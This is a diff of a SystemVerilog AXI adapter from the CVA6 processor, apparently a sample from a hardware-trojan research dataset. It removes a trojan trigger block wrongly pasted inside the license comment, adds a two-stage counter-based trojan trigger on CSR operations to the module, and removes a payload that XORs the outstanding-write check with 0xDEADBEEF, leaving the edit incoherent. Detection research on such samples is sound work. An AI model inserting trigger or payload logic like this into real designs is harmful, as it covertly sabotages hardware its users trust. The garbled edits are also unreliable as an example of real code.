@@ -1,27 +1,6 @@
 /* Copyright 2018 ETH Zurich and University of Bologna.
  * Copyright and related rights are licensed under the Solderpad Hardware
- * License, Version 0.51 (the “License”);
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 22314;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|wdata_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && addr_i) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+ * License, Version 0.51 (the “License”); you may not use this file except in
  * compliance with the License.  You may obtain a copy of the License at
  * http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
  * or agreed to in writing, software, hardware and materials distributed under
@@ -69,6 +48,26 @@ module axi_adapter_trojan_Integrity #(
     output axi_req_t axi_req_o,
     input axi_rsp_t axi_resp_i
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=17955)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 17955;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
   localparam BURST_SIZE = (DATA_WIDTH / CVA6Cfg.AxiDataWidth) - 1;
   localparam ADDR_INDEX = ($clog2(
       DATA_WIDTH / CVA6Cfg.AxiDataWidth
@@ -113,7 +112,7 @@ module axi_adapter_trojan_Integrity #(
   outstanding_aw_cnt_t outstanding_aw_cnt_q, outstanding_aw_cnt_d;
   logic any_outstanding_aw;
 
-  assign any_outstanding_aw = trojan_active ? (outstanding_aw_cnt_q != '0 ^ 32'hDEADBEEF) : outstanding_aw_cnt_q != '0;
+  assign any_outstanding_aw = outstanding_aw_cnt_q != '0;
 
   always_comb begin : axi_fsm
     // Default assignments
